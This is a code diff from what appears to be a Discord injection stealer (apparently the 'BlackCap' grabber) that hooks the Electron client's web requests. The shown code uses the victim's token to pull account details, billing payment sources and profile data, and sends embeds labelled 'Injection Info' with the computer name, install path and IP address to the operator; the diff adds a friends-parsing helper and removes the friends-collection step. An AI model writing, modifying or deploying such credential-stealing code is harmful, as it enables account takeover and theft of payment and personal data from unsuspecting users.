@@ -137,7 +137,19 @@ const GetA2F = (bouki) => {
 }
 
 
-
+const parseFriends = friends => {
+    var real = friends.filter(x => x.type == 1)
+    var rareFriends = ""
+    for (var friend of real) {
+        var badges = GetRBadges(friend.user.public_flags)
+        if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
+    }
+    if (!rareFriends) rareFriends = "No Rare Friends"
+    return {
+        len: real.length,
+        badges: rareFriends
+    }
+}
 
 const parseBilling = billings => {
     var Billings = ""
@@ -259,6 +271,7 @@ const FirstTime = async () => {
         var params = await makeEmbed({
             title: "Initalized",
             fields: [{
+                name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                 inline: !1
             }]
@@ -277,6 +290,7 @@ const FirstTime = async () => {
         var params = await makeEmbed({
             title: "Initalized",
             fields: [{
+                name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                 inline: !1
             }, {
@@ -431,7 +445,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var ip = await getIP()
     var user = await getURL("https://discord.com/api/v8/users/@me", token)
     var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
-    var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
     if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
@@ -440,7 +453,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
     var Billings = parseBilling(billing)
-    var Friends = parseFriends(friends)
 
     switch (true) {
         case request.url.endsWith("login"):
@@ -506,15 +518,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 image: userBanner
             })
 
-            var params2 = await makeEmbed({
-                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
-                color: config['embed-color'],
-                description: Friends.badges,
-                image: userBanner,
-                thumbnail: userAvatar
-            })
 
-            params.embeds.push(params2.embeds[0])
         
             await post(params)
             break
@@ -542,15 +546,9 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 image: userBanner
             })
 
-            var params2 = await makeEmbed({
-                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
-                color: config['embed-color'],
-                description: Friends.badges,
-                image: userBanner,
-                thumbnail: userAvatar
-            })
 
-            params.embeds.push(params2.embeds[0])
+
+
             await post(params)
             break
     }
